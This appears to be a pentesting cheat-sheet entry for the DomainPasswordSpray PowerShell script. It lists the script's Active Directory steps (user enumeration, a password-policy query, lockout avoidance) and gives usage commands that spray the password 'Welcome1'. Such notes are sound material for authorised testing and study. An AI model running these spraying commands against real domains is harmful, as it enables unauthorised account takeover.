-- -
PowerShell script for enumerating and password spraying AD. If authenticated to the domain, it will:
- Generate a userlist
- Query the password Policy
- Exclude accounts within one attempt of lock out
- Password spray on generated user list if password string is provided
#### Usage
```powershell
Import-Module .\DomainPasswordSpray.ps1 # import module to use it
Invoke-DomainPasswordSpray -Password <str> -Outfile <output file> -ErrorAction SilentlyContinue

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```